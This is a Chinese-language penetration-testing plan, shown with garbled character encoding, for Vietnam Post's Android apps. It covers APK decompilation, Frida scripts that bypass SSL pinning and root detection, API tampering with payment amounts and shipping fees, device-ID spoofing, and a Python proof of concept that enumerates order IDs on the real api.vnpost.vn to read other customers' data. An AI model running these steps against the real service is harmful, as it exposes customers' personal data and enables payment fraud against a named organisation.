# ğŸ¯ è¶Šå—é‚®æ”¿ï¼ˆVIETNAM POSTï¼‰Appæ¸—é€æµ‹è¯•

## ğŸ“‹ ç›®æ ‡ä¿¡æ¯

**å¼€å‘è€…**: VIETNAM POST  
**APKPureé“¾æ¥**: https://apkpure.net/cn/developer/VIETNAM%20POST  
**æµ‹è¯•æ—¥æœŸ**: 2025-10-21  
**æµ‹è¯•äººå‘˜**: Red Team Specialist

---

## ğŸ” å¯èƒ½çš„ç›®æ ‡åº”ç”¨

æ ¹æ®è¶Šå—é‚®æ”¿ä¸šåŠ¡ï¼Œå¯èƒ½åŒ…å«ä»¥ä¸‹Appï¼š

1. **VNPost** - è¶Šå—é‚®æ”¿å®˜æ–¹Appï¼ˆå¯„ä»¶ã€è¿½è¸ªï¼‰
2. **VNPost Payment** - æ”¯ä»˜æœåŠ¡
3. **VNPost Logistics** - ç‰©æµç®¡ç†
4. **VNPost Mobile** - ç§»åŠ¨ç«¯æœåŠ¡

---

## ğŸ› ï¸ æ¸—é€æµ‹è¯•æµç¨‹

### é˜¶æ®µ1: ä¿¡æ¯æ”¶é›†

```bash
# 1. ä»APKPureä¸‹è½½ç›®æ ‡APK
# æ–¹æ³•1: æ‰‹åŠ¨ä¸‹è½½
# è®¿é—®: https://apkpure.net/cn/developer/VIETNAM%20POST
# é€‰æ‹©ç›®æ ‡Appå¹¶ä¸‹è½½APK

# æ–¹æ³•2: ä½¿ç”¨å·¥å…·ä¸‹è½½ï¼ˆéœ€è¦APKPure APIï¼‰
# wget "https://d.apkpure.com/b/APK/..." -O vnpost.apk

# 2. è·å–APKåŒ…å
aapt dump badging vnpost.apk | grep package

# 3. æŸ¥çœ‹æƒé™
aapt dump permissions vnpost.apk
```

### é˜¶æ®µ2: é™æ€åˆ†æ

```bash
# ä½¿ç”¨è‡ªåŠ¨åŒ–è„šæœ¬
cd /workspace/vnpost_pentest
./apk_analyzer.sh vnpost.apk

# æ‰‹åŠ¨åç¼–è¯‘
apktool d vnpost.apk -o decompiled

# è½¬æ¢ä¸ºJARæŸ¥çœ‹Javaä»£ç 
d2j-dex2jar vnpost.apk
jd-gui vnpost-dex2jar.jar

# å…³é”®æ£€æŸ¥ç‚¹:
# âœ“ AndroidManifest.xml - å¯¼å‡ºç»„ä»¶/æƒé™
# âœ“ strings.xml - ç¡¬ç¼–ç å¯†é’¥
# âœ“ res/raw/ - é…ç½®æ–‡ä»¶
# âœ“ assets/ - æ•°æ®åº“/è¯ä¹¦
# âœ“ lib/*.so - Nativeåº“
```

### é˜¶æ®µ3: åŠ¨æ€åˆ†æ

```bash
# 1. åœ¨çœŸæœº/æ¨¡æ‹Ÿå™¨å®‰è£…
adb install vnpost.apk

# 2. å¯åŠ¨Frida Server
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# 3. è¿è¡ŒHookè„šæœ¬
frida -U -f vn.vnpost.app -l vnpost_frida_hooks.js --no-pause

# 4. SSL Pinningç»•è¿‡
frida -U -f vn.vnpost.app -l frida_ssl_bypass.js --no-pause

# 5. Rootæ£€æµ‹ç»•è¿‡
frida -U -f vn.vnpost.app -l frida_root_bypass.js --no-pause
```

### é˜¶æ®µ4: ç½‘ç»œæµé‡åˆ†æ

```bash
# 1. é…ç½®ä»£ç†
adb shell settings put global http_proxy 192.168.1.100:8080

# 2. å¯åŠ¨BurpSuite/mitmproxy
mitmdump -s api_interceptor.py --listen-port 8080

# 3. ç»•è¿‡SSL PinningåæŠ“åŒ…
# ä½¿ç”¨Fridaè„šæœ¬ + BurpSuiteç»„åˆ

# 4. æµ‹è¯•ç‚¹:
# - ç™»å½•æ¥å£å‚æ•°ç¯¡æ”¹
# - Tokené‡æ”¾æ”»å‡»
# - APIè¶Šæƒæµ‹è¯•
# - æ”¯ä»˜é‡‘é¢ä¿®æ”¹
# - è®¢å•çŠ¶æ€ç¯¡æ”¹
```

---

## ğŸ¯ æ”»å‡»é¢åˆ†æ

### 1. ç™»å½•è®¤è¯

**æµ‹è¯•é¡¹**:
- [ ] å¼±å¯†ç ç­–ç•¥
- [ ] æš´åŠ›ç ´è§£é˜²æŠ¤
- [ ] Sessionç®¡ç†
- [ ] å¤šè®¾å¤‡ç™»å½•æ§åˆ¶
- [ ] ç™»å½•å‡­è¯ä¼ è¾“åŠ å¯†

**Payloadç¤ºä¾‹**:
```json
POST /api/login
{
  "username": "test@vnpost.vn",
  "password": "123456",
  "device_id": "xxx"
}
```

### 2. å¯„ä»¶/ç‰©æµä¸šåŠ¡

**æµ‹è¯•é¡¹**:
- [ ] è®¢å•IDå¯é¢„æµ‹æ€§ï¼ˆIDORï¼‰
- [ ] è¿è´¹è®¡ç®—é€»è¾‘ç¯¡æ”¹
- [ ] æ”¶ä»¶äººä¿¡æ¯è¶ŠæƒæŸ¥çœ‹
- [ ] æ‰¹é‡æŸ¥è¯¢æ¥å£æ»¥ç”¨

**æ”»å‡»å‘é‡**:
```bash
# IDORæµ‹è¯•
GET /api/order/12345 â†’ éå†12344, 12346...

# è¿è´¹ç¯¡æ”¹
POST /api/calculate-fee
{"weight": 1, "distance": 100}
# ä¿®æ”¹ä¸º {"weight": 0.1, "distance": 10}
```

### 3. æ”¯ä»˜åŠŸèƒ½

**é«˜å±æµ‹è¯•é¡¹**:
- [ ] é‡‘é¢å‚æ•°å®¢æˆ·ç«¯å¯æ§
- [ ] æ”¯ä»˜çŠ¶æ€å›è°ƒéªŒè¯
- [ ] ä¼˜æƒ åˆ¸é‡æ”¾æ”»å‡»
- [ ] å……å€¼é‡‘é¢ç¯¡æ”¹

**Critical Payload**:
```json
POST /api/payment/create
{
  "order_id": "ORD123",
  "amount": 1000000,  // å°è¯•æ”¹ä¸º 1
  "currency": "VND"
}
```

### 4. ç”¨æˆ·éšç§

**æ•æ„Ÿæ•°æ®æ³„éœ²æ£€æŸ¥**:
- [ ] APIè¿”å›å¤šä½™ç”¨æˆ·ä¿¡æ¯
- [ ] æ—¥å¿—æ–‡ä»¶åŒ…å«æ•æ„Ÿæ•°æ®
- [ ] SharedPreferencesæ˜æ–‡å­˜å‚¨
- [ ] æ•°æ®åº“æœªåŠ å¯†
- [ ] ç½‘ç»œä¼ è¾“æœªåŠ å¯†

---

## ğŸ”¥ å·²çŸ¥æ”»å‡»æŠ€æœ¯

### æŠ€æœ¯1: SSL Pinningç»•è¿‡
```bash
# ä½¿ç”¨Fridaè„šæœ¬
frida -U -f vn.vnpost.app -l frida_ssl_bypass.js --no-pause

# ç„¶åç”¨BurpSuiteæŠ“åŒ…
```

### æŠ€æœ¯2: APIç­¾åç ´è§£
```python
# åˆ†æç­¾åç®—æ³•
# 1. Hook Cipherç±»è·å–åŠ å¯†key
# 2. åç¼–è¯‘æŸ¥æ‰¾ç­¾åç”Ÿæˆä»£ç 
# 3. é‡ç°ç­¾åç®—æ³•
import hashlib
def generate_signature(params, secret):
    sorted_params = sorted(params.items())
    sign_str = '&'.join([f"{k}={v}" for k, v in sorted_params])
    return hashlib.md5((sign_str + secret).encode()).hexdigest()
```

### æŠ€æœ¯3: è®¾å¤‡æŒ‡çº¹ä¼ªé€ 
```javascript
// Hookè®¾å¤‡IDè·å–
var TelephonyManager = Java.use("android.telephony.TelephonyManager");
TelephonyManager.getDeviceId.implementation = function() {
    console.log("[+] è®¾å¤‡IDè¢«ä¼ªé€ ");
    return "fake_device_id_123456";
};
```

---

## ğŸ“Š é¢„æœŸå‘ç°çš„æ¼æ´

åŸºäºé‚®æ”¿ç±»Appå¸¸è§é—®é¢˜ï¼š

| æ¼æ´ç±»å‹ | ä¸¥é‡ç¨‹åº¦ | æè¿° |
|---------|---------|------|
| **IDOR** | é«˜ | è®¢å•IDå¯éå†ï¼ŒæŸ¥çœ‹ä»–äººè®¢å• |
| **æ”¯ä»˜ç¯¡æ”¹** | ä¸¥é‡ | è¿è´¹/é‡‘é¢å‚æ•°å®¢æˆ·ç«¯å¯æ§ |
| **è¶Šæƒè®¿é—®** | é«˜ | APIç¼ºå°‘ç”¨æˆ·æƒé™éªŒè¯ |
| **æ•æ„Ÿä¿¡æ¯æ³„éœ²** | ä¸­ | APIè¿”å›è¿‡å¤šç”¨æˆ·éšç§ |
| **ä¸šåŠ¡é€»è¾‘** | é«˜ | ä¼˜æƒ åˆ¸/ç§¯åˆ†é‡æ”¾åˆ©ç”¨ |
| **SSLæœªåŠ å›º** | ä¸­ | æ˜“è¢«ä¸­é—´äººæ”»å‡» |

---

## ğŸ“ æµ‹è¯•æŠ¥å‘Šæ¨¡æ¿

### æ¼æ´æŠ¥å‘Šç¤ºä¾‹

**æ ‡é¢˜**: VNPost App - è®¢å•ä¿¡æ¯è¶Šæƒè®¿é—®ï¼ˆIDORï¼‰

**ä¸¥é‡ç¨‹åº¦**: é«˜å±

**æ¼æ´æè¿°**:
VNPoståº”ç”¨çš„è®¢å•æŸ¥è¯¢æ¥å£ `/api/order/{order_id}` å­˜åœ¨IDORæ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡éå†è®¢å•IDæŸ¥çœ‹ä»»æ„ç”¨æˆ·çš„è®¢å•è¯¦æƒ…ï¼ŒåŒ…æ‹¬ï¼š
- æ”¶ä»¶äººå§“åã€ç”µè¯ã€åœ°å€
- å¯„ä»¶äººä¿¡æ¯
- åŒ…è£¹å†…å®¹
- è¿è´¹é‡‘é¢

**å¤ç°æ­¥éª¤**:
1. ç™»å½•VNPost Appï¼Œåˆ›å»ºä¸€ä¸ªè®¢å•ï¼Œè·å–è®¢å•å·ï¼ˆå¦‚ï¼šVNP123456ï¼‰
2. æ‹¦æˆªAPIè¯·æ±‚ï¼š`GET https://api.vnpost.vn/api/order/VNP123456`
3. ä¿®æ”¹è®¢å•å·ä¸ºVNP123457ã€VNP123458...
4. æˆåŠŸè·å–å…¶ä»–ç”¨æˆ·çš„è®¢å•è¯¦æƒ…

**PoCä»£ç **:
```python
import requests

base_url = "https://api.vnpost.vn"
headers = {"Authorization": "Bearer YOUR_TOKEN"}

for i in range(123450, 123500):
    order_id = f"VNP{i}"
    resp = requests.get(f"{base_url}/api/order/{order_id}", headers=headers)
    if resp.status_code == 200:
        print(f"[+] å‘ç°è®¢å•: {order_id}")
        print(resp.json())
```

**ä¿®å¤å»ºè®®**:
1. åœ¨åç«¯éªŒè¯å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰æƒé™æŸ¥çœ‹è¯¥è®¢å•
2. ä½¿ç”¨UUIDæ›¿ä»£è‡ªå¢ID
3. æ·»åŠ è®¿é—®æ—¥å¿—å’Œå¼‚å¸¸ç›‘æ§

---

## ğŸš€ å¿«é€Ÿå¼€å§‹

```bash
# 1. è¿›å…¥å·¥ä½œç›®å½•
cd /workspace/vnpost_pentest

# 2. ä¸‹è½½APKï¼ˆæ‰‹åŠ¨æˆ–è„šæœ¬ï¼‰
# æ”¾ç½®åˆ°æ­¤ç›®å½•: vnpost.apk

# 3. è¿è¡Œè‡ªåŠ¨åŒ–åˆ†æ
./apk_analyzer.sh vnpost.apk

# 4. æŸ¥çœ‹æŠ¥å‘Š
cat analysis_output/reports/penetration_test_report.md

# 5. åŠ¨æ€æµ‹è¯•ï¼ˆéœ€è¦çœŸæœºï¼‰
frida -U -f vn.vnpost.app -l vnpost_frida_hooks.js --no-pause
```

---

## ğŸ“š å‚è€ƒèµ„æº

- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
- [Fridaå®˜æ–¹æ–‡æ¡£](https://frida.re/docs/)
- [APKTool](https://ibotpeaches.github.io/Apktool/)
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

---

**å…è´£å£°æ˜**: æœ¬æµ‹è¯•ä»…ç”¨äºæˆæƒçš„å®‰å…¨è¯„ä¼°ï¼Œæœªç»è®¸å¯è¯·å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ã€‚
